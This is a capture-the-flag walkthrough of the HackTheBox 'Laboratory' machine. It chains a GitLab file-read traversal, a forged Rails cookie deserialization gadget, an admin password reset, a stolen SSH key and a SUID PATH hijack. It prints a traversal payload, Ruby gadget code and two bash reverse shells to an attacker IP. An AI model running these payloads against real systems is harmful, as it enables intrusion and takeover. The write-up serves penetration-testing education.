# HTB Laboratory — Full Walkthrough
**Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.12.122

---

## The Mindset Before You Start

Every machine on HackTheBox (and in real pentests) follows a repeatable mental model:

1. **Reconnaissance** — figure out what's running
2. **Enumeration** — dig deeper into what you find
3. **Exploitation** — abuse a vulnerability to get access
4. **Post-Exploitation** — move laterally and escalate privileges

You always start from zero knowledge and build your picture of the target incrementally. The goal is to find the weakest link — the thing the machine owner forgot to lock down.

---

## Phase 1 — Reconnaissance

### Step 1: Update /etc/hosts

Before scanning, we set our attacker IP as a variable for convenience:

```
Attacker IP: 10.10.16.84
Target IP:   10.129.12.122
```

**Why?** On HTB machines, web servers often use virtual hosting — they serve different content depending on the `Host:` header in HTTP requests. If you just browse to the IP, you might miss entire sites. We need the hostnames to access those virtual hosts.

---

### Step 2: Nmap Port Scan — Find Open Doors

```bash
sudo nmap -p- --min-rate 10000 -oA lab-alltcp 10.129.12.122
```

**What this does:**
- `-p-` — scan ALL 65535 ports, not just the common 1000
- `--min-rate 10000` — send at least 10,000 packets per second (fast)
- `-oA` — save output in all formats for later reference

**Why scan all ports?** Services can run on non-standard ports. A developer might put a management panel on port 8443 or a database on 3306. If you only scan the top 1000, you might miss it. On HTB machines especially, scanning all ports is mandatory.

**Result:**
```
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Three services. SSH (remote access), HTTP (web), HTTPS (encrypted web). This tells us it's a web application server.

---

### Step 3: Detailed Service Scan — What Versions?

```bash
sudo nmap -p 22,80,443 -sCV 10.129.12.122
```

**What this does:**
- `-sC` — run default NSE scripts (automated checks)
- `-sV` — detect service versions
- Focused on just the three open ports (faster)

**Why version detection?** Every piece of software has known vulnerabilities. Once you know "this is Apache 2.4.41" or "this is GitLab 12.8.1", you can search for public exploits. Version = attack surface.

**Critical finding from the TLS certificate:**
```
ssl-cert: Subject: commonName=laboratory.htb
Subject Alternative Name: DNS:git.laboratory.htb
```

**Hacker mindset:** TLS certificates are goldmines for reconnaissance. They're signed identity documents — they tell you the real hostname(s) the server was configured for. The SAN (Subject Alternative Name) field reveals `git.laboratory.htb` — a subdomain we wouldn't have found any other way at this stage.

---

### Step 4: Add Hostnames to /etc/hosts

```bash
echo "10.129.12.122 laboratory.htb git.laboratory.htb" | sudo tee -a /etc/hosts
```

**Why?** Your computer resolves hostnames to IPs using DNS. Since this is a private HTB machine, there's no DNS server that knows about `laboratory.htb`. By adding it to `/etc/hosts`, we manually tell our computer "when you see `laboratory.htb`, connect to `10.129.12.122`". Without this step, your browser would fail to load the site.

---

## Phase 2 — Enumeration

### Step 5: Browse the Web Application

Visiting `https://laboratory.htb` shows a static company website — a security consultancy. Not much to attack directly.

Visiting `https://git.laboratory.htb` reveals **GitLab Community Edition**.

**Hacker mindset:** GitLab is an extremely common target because:
1. It's often misconfigured (public registration allowed)
2. It contains source code with secrets (passwords, API keys)
3. It runs complex Rails code that has had historical vulnerabilities
4. The version number is often visible in the UI

---

### Step 6: Identify the GitLab Version

After registering an account (using `anything@laboratory.htb` — the server rejects non-laboratory.htb emails), go to `https://git.laboratory.htb/help`.

**Version: GitLab Community Edition 12.8.1**

**Why register?** Many GitLab vulnerabilities require authentication. An attacker registering a free account is a completely normal action — it's how the software is designed to work. From an authenticated position, you have a much larger attack surface.

**Why check the version?** This is the single most important piece of information. With a version number, you can search:
- `searchsploit gitlab 12`
- Google: `gitlab 12.8.1 exploit`
- CVE databases

This reveals **CVE-2020-10977** — an arbitrary file read vulnerability affecting GitLab <= 12.9.0.

---

## Phase 3 — Exploitation (Getting a Foothold)

### Step 7: CVE-2020-10977 — Arbitrary File Read

**The vulnerability explained:**

When you create an issue in GitLab and attach an image using Markdown like:
```
![img](/uploads/abc123/filename.png)
```

GitLab processes this upload path. The bug: if you move the issue to a different project, GitLab re-processes the upload path WITHOUT properly sanitizing directory traversal sequences (`../../../`). This lets you read ANY file the GitLab process has permission to read.

**How to exploit it manually:**

1. Create two projects: `proj1` and `proj2`
2. In `proj1`, create an issue with this description:
   ```
   ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
   ```
3. Move the issue to `proj2` using the "Move issue" option in the right sidebar
4. In `proj2`, the issue now has a file attachment — click it to download `/etc/passwd`

**Hacker mindset:** The `11111111111111111111111111111111` is a fake upload hash (32 chars). GitLab's file server resolves the path starting from the uploads directory. The `../../../../../../` sequences navigate UP the directory tree all the way to the filesystem root, then descend into `etc/passwd`. This is a classic **path traversal** attack.

---

### Step 8: Read secrets.yml — The Master Key

The real target isn't `/etc/passwd` — it's the Rails application's secret key. We read:

```
/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
```

This file contains:
```yaml
production:
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```

**Why is this important?** Rails uses `secret_key_base` to cryptographically sign cookies. It's the HMAC signing key. If you know this secret, you can:
1. Forge any cookie value
2. Make Rails trust and deserialize it
3. Achieve **Remote Code Execution** through Ruby object deserialization

This is the pivot from "read files" to "run code". The file read vulnerability becomes an RCE vulnerability because we know the secret.

---

### Step 9: Understanding the Deserialization Attack

**What is deserialization?**

Rails stores signed cookies as:
```
base64(Marshal.dump(ruby_object))--HMAC_signature
```

When Rails receives a request with a signed cookie, it:
1. Verifies the HMAC signature (to confirm the cookie wasn't tampered with)
2. Deserializes the Marshal binary data back into a Ruby object
3. Uses that object in the application

**The attack:** If we know the `secret_key_base`, we can sign our OWN malicious cookie. We craft a Ruby object that executes shell commands when deserialized. Rails trusts our signature, deserializes the object, and runs our code.

**The gadget chain:**

```ruby
# ERB is Ruby's templating engine
# <%= `command` %> executes a shell command when result() is called
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1'` %>")

# DeprecatedInstanceVariableProxy is an ActiveSupport class
# When ANY method is called on it, it calls target() which calls erb.result()
# This triggers the ERB evaluation (and our shell command)
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(
  erb, :result, "@result", ActiveSupport::Deprecation.new
)

# Signing it with our stolen secret key
verifier = ActiveSupport::MessageVerifier.new(derived_key, serializer: Marshal)
cookie_value = verifier.generate(depr)
```

When the target GitLab receives this cookie, it deserializes the proxy object. The moment Rails accesses ANY property or calls ANY method on it (which happens automatically), the proxy calls `erb.result`, which evaluates the ERB template, which runs our bash reverse shell.

---

### Step 10: The Ruby Version Problem and How We Solved It

**The challenge:** We can't just run this Ruby code anywhere.

- We tried **Ruby 3.3** (system Ruby) — FAILED. `ERB` objects have singleton classes in Ruby 3.x that prevent Marshal serialization. Error: `singleton class can't be dumped`
- We tried **Docker with GitLab 12.8.1** (amd64 image) — FAILED. Our Kali machine is ARM64 (Apple Silicon / ARM chip), and the GitLab Docker image is x86-64 only.
- We tried **Ruby 2.7** (arm64 Docker image) — FAILED. Same singleton class issue.

**The solution:** GitLab 12.8.1 uses **Ruby 2.6** (you can see this from the path `/opt/gitlab/embedded/lib/ruby/gems/2.6.0/`). In Ruby 2.6, `ERB` objects CAN be Marshal'd. We use an ARM64 Ruby 2.6 Docker image:

```bash
sudo docker pull arm64v8/ruby:2.6-alpine
sudo docker run --rm arm64v8/ruby:2.6-alpine sh -c "
  gem install zeitwerk -v 2.6.18 --no-document -q &&
  gem install activesupport -v 6.0.2 --no-document -q &&
  ruby -e '..cookie generation code..'
"
```

**Hacker mindset:** When something fails, ask "why?" and "what's different about the target environment?" The version mismatch between our attack machine and the target is the reason. Always match your exploit environment to the target's environment as closely as possible.

---

### Step 11: Generate and Send the Cookie

The Docker container outputs our malicious cookie:
```
BAhvOkBBY3RpdmVTdXBwb3J0...--eae9e6af8cdf12deec884110b0adcf23906dbc12
```

Start a netcat listener:
```bash
nc -lvnp 4444
```

Send the cookie:
```bash
curl -k -s "https://git.laboratory.htb/users/sign_in" \
  -b "experimentation_subject_id=BAhvOk..." \
  -o /dev/null
```

**Why `experimentation_subject_id`?** GitLab uses this cookie for A/B testing features. The middleware that reads and deserializes this cookie runs on EVERY request, including unauthenticated ones. This is the attack vector — we don't need to be logged in.

**Why send to `/users/sign_in`?** It's a publicly accessible endpoint that will trigger the middleware. Any endpoint would work, but this is simple and reliable.

**Result:** Shell as `git` inside the GitLab Docker container.

```
git@git:~/gitlab-rails/working$ id
uid=998(git) gid=998(git) groups=998(git)
```

---

## Phase 4 — Post-Exploitation (Inside the Container)

### Step 12: Container Enumeration

We're inside a Docker container, not the actual host machine. How do we know?
- No users in `/home`
- `/proc/net/fib_trie` shows IP `172.17.0.2` (Docker bridge network)
- The `/.dockerenv` file exists

**Hacker mindset:** Getting a shell is just the beginning. You need to understand your position:
- What user are you?
- What machine are you actually on?
- What can you reach from here?
- What secrets are accessible from this position?

---

### Step 13: Reset Dexter's Password via GitLab Rails Console

We have access to the GitLab application. The `git` user can run `gitlab-rails console` — a direct Ruby interactive console connected to the GitLab database.

```bash
gitlab-rails console
```

```ruby
user = User.where(id: 1).first  # User ID 1 is always the first admin
# => #<User id:1 @dexter>
user.password = 'Password123!'
user.password_confirmation = 'Password123!'
user.save!
# => true
```

**Why?** Dexter is the GitLab admin. Admins can see all projects including private ones. After resetting the password, we log into the GitLab web interface as dexter and find a **private repository** called `SecureDocker`.

**Hacker mindset:** In enterprise environments, admins often store sensitive materials in "private" repositories — SSH keys, credentials, deployment scripts. Gaining admin access to a code repository is often as valuable as gaining server access because developers store secrets there.

---

### Step 14: Extract Dexter's SSH Private Key

Inside the `SecureDocker` repository, dexter stored his personal SSH private key at `.ssh/id_rsa`. We download it.

This key gives us the ability to SSH directly into the **host machine** (not just the container) as `dexter`.

---

## Phase 5 — Accessing the Host Machine

### Step 15: The OpenSSL 3.x Compatibility Issue

```bash
ssh -i dexter_.ssh_id_rsa dexter@laboratory.htb
# Load key "dexter_.ssh_id_rsa": error in libcrypto: unsupported
```

**Why does this fail?** Our Kali Linux has OpenSSL 3.6.2 installed. OpenSSL 3.x has stricter security policies and removed support for certain legacy key operations. Dexter's SSH key was generated on the target machine (Ubuntu 20.04 with an older OpenSSL), and something about the key's format or parameters doesn't meet OpenSSL 3's requirements.

**The fix — use Python's Paramiko library:**

Paramiko is Python's SSH implementation. It uses the `cryptography` Python library (which has its own key handling) rather than calling the system's OpenSSL directly. This bypasses the compatibility issue entirely.

```python
import paramiko
k = paramiko.RSAKey.from_private_key_file('/home/kali/Downloads/htb/dexter_.ssh_id_rsa')
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('laboratory.htb', username='dexter', pkey=k)
stdin, stdout, stderr = c.exec_command('id && cat ~/user.txt')
print(stdout.read().decode())
```

**Hacker mindset:** When a tool fails, use a different tool. The goal is to achieve the action (SSH with a key), not to use a specific binary. Paramiko, puttygen, openssl, or even a different OS could all solve this problem. Think about the goal, not the method.

**User flag:** `30c431[redacted]c3646856`

---

## Phase 6 — Privilege Escalation (User to Root)

### Step 16: Enumerate SUID Binaries

SUID (Set User ID) binaries run as their **owner** regardless of who executes them. A binary owned by root with SUID set will run as root even if a regular user executes it.

```bash
find / -perm -4000 -user root -ls 2>/dev/null
```

The interesting result:
```
7838  20 -rwsr-xr-x  1 root  dexter  16720  Aug 28 2020  /usr/local/bin/docker-security
```

Note: this binary is owned by `root` (runs as root when executed) but is in the `dexter` group (dexter can execute it). It's only 16KB — this is a custom binary, not a standard system tool.

**Hacker mindset:** Standard system SUID binaries (sudo, passwd, etc.) are well-audited and hard to exploit. Custom SUID binaries written by the box creator are almost always intentionally vulnerable. A 16KB custom SUID binary called `docker-security` is a massive red flag and should be the first thing you analyze.

---

### Step 17: Analyze the SUID Binary with ltrace

`ltrace` intercepts library calls made by a program. For this binary:

```bash
ltrace docker-security
```

Output:
```
setuid(0)
setgid(0)
system("chmod 700 /usr/bin/docker"...)
system("chmod 660 /var/run/docker.sock"...)
```

**The vulnerability revealed:**

The binary calls `system("chmod 700 /usr/bin/docker")` — it runs `chmod` **without a full path**. When a program calls `system("chmod")`, Linux searches for `chmod` in the directories listed in the `PATH` environment variable, **in order**.

If we control the PATH variable, we control which `chmod` binary gets executed.

---

### Step 18: PATH Hijack — The Attack

**The concept:**

The binary does (pseudocode):
```
setuid(0)     ← become root
setgid(0)     ← become root group
system("chmod 700 /usr/bin/docker")  ← runs "chmod" from PATH
```

If we create our own script called `chmod` in `/tmp` and put `/tmp` FIRST in the PATH, then when `docker-security` runs `chmod`, it runs OUR `chmod` instead of `/usr/bin/chmod`. And since `docker-security` has already called `setuid(0)`, our script runs as root.

**The exploit:**

```python
# Via paramiko since we can't easily SSH interactively
cmds = """
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.16.84/5555 0>&1\n' > /tmp/chmod
chmod +x /tmp/chmod
export PATH=/tmp:$PATH
/usr/local/bin/docker-security
"""
```

**Breaking this down:**
1. `printf '#!/bin/bash\nbash...' > /tmp/chmod` — create a script named `chmod` that opens a reverse shell. The `#!/bin/bash` shebang is REQUIRED — without it, the system uses `/bin/sh` which doesn't support `>&` redirect syntax.
2. `chmod +x /tmp/chmod` — make our fake chmod executable (using the REAL chmod, since PATH hasn't been changed yet)
3. `export PATH=/tmp:$PATH` — prepend `/tmp` to PATH so our fake chmod is found first
4. `/usr/local/bin/docker-security` — trigger the exploit

**Result:**
```
root@laboratory:~# id
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
```

**Root flag:** `17d585[redacted]11843934f7`

---

## Summary of the Full Attack Chain

```
[ATTACKER] nmap scan
    → Discovers ports 22, 80, 443
    → TLS cert reveals git.laboratory.htb

[ATTACKER] Browse git.laboratory.htb  
    → GitLab 12.8.1 — vulnerable to CVE-2020-10977

[CVE-2020-10977] Arbitrary file read
    → Read /opt/gitlab/embedded/.../secrets.yml
    → Extract secret_key_base

[COOKIE DESERIALIZATION] Forge malicious Rails cookie
    → Use Ruby 2.6 + activesupport 6.0.2 in Docker
    → Sign with stolen secret_key_base
    → Send as experimentation_subject_id cookie

[RCE] Shell as git inside GitLab Docker container
    
[GITLAB RAILS CONSOLE] Reset dexter's password
    → Access dexter's private SecureDocker repo
    → Extract dexter's SSH private key

[SSH as dexter] Use Python paramiko (OpenSSL 3 bypass)
    → USER FLAG: 30c43[redacted]ebc3646856

[SUID + PATH HIJACK] /usr/local/bin/docker-security
    → Calls system("chmod") without full path
    → Place malicious chmod in /tmp, prepend to PATH
    → SUID binary runs our chmod as root

[ROOT] ROOT FLAG: 17d585[redacted]3934f7
```

---

## Key Lessons and Takeaways

### 1. Certificates leak information
TLS certs often contain internal hostnames in SAN fields. Always check them with nmap or `openssl s_client`.

### 2. Version numbers are everything
Knowing the exact software version turns "there's a web app here" into "there's a specific CVE here". Always fingerprint software versions.

### 3. File reads can escalate to RCE
An arbitrary file read vulnerability sounds less scary than RCE, but if you can read the right file (like Rails `secrets.yml` or SSH private keys), it becomes effectively equivalent to RCE.

### 4. Match your environment to the target
The deserialization exploit failed in Ruby 2.7 but worked in Ruby 2.6 because that's what the TARGET runs. Always research what runtime version the target uses and replicate it.

### 5. Docker containers are not the end
Getting a shell inside a container isn't the end of the exploit chain. Use the container's privileged access to its application (GitLab in this case) to pivot to the host.

### 6. SUID binaries with relative paths = PATH hijack
Any SUID binary that calls `system("program")` without a full path like `system("/usr/bin/program")` is vulnerable to PATH hijacking. `ltrace` and `strace` are your best friends for finding these.

### 7. Tools fail, goals don't change
When `ssh` failed with OpenSSL 3.x errors, the goal was still "authenticate as dexter via SSH key". Python's Paramiko achieved the same goal with a different tool.
